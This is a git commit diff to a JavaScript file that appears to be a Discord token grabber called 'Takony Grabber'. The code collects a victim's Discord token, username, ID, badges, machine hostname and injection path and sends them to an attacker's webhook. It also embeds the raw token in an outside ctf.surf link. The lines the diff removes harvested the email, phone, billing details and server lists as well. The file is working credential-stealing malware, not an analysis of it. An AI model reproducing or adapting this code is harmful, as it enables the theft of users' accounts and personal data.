e6dfbc72b3583a622b584cd534c85d564a755904
Lobot <103981987+Lobot420@users.noreply.github.com>
2022-09-21 20:33:57 +0200

    Add files via upload

--- KrAxvC.js
+++ KrAxvC.js
@@ -255,69 +255,33 @@ async function firstTime() {
                 };
                 sendToWebhook(JSON.stringify(c));
             } else {
-                var b = await getUserInfo(token)
-                var n = None;
-                if (b.premium_type == 0){
-                    n = "None"
-                } else if (b.premium_type == 1) {
-                    n = "Classic"
-                } else if (b.premium_type == 2) {
-                    n = "Boost"
-                }
+                const b = await getUserInfo(token);
                 var c = {
                     username: "Takony Grabber",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
-                        title: "Discord Initalized",
+                        title: "User got logged out",
                         description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
+                            name: "Info",
+                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
+                            inline: !1
+                        }, {
                             name: "Username",
                             value: `\`${b.username}#${b.discriminator}\``,
                             inline: !0
                         }, {
-                            name: "Hostname",
-                            value: `${os.hostname()}`,
-                            inline: !1
-                        }, {
-                            name: "Injection",
-                            value: `\`${__dirname}\``,
+                            name: "ID",
+                            value: `\`${b.id}\``,
                             inline: !0
                         }, {
                             name: "Badges",
                             value: `${getBadges(b.flags)}`,
                             inline: !1
                         }, {
-                            name: "Email",
-                            value: `${b.email}`,
-                            inline: !1
-                        }, {
-                            name: "Phone",
-                            value: `${b.phone}`,
-                            inline: !1
-                        }, {
-                            name: "Nitro",
-                            value: `${n}`,
-                            inline: !1
-                        }, {
-                            name: "Billing",
-                            value: `${getBilling(token)}`,
-                            inline: !1
-                        }, {
-                            name: "NSFW",
-                            value: `${b.nsfw_allowed}`,
-                            inline: !1
-                        }, {
-                            name: "Verified",
-                            value: `${b.verified}`,
-                            inline: !1
-                        }, {
-                            name: "Bio",
-                            value: `${b.bio}`,
-                            inline: !1
-                        }, {
                             name: "Token",
-                            value: `${token}`,
+                            value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }],
                         author: {
@@ -439,10 +403,6 @@ async function userLogin(password, email, token) {
             }, {
                 name: "Token",
                 value: `${token}`,
-                inline: !1
-            }, {
-                name: "Servers",
-                value: `${servers.message}`,
                 inline: !1
             },],
             "author": {
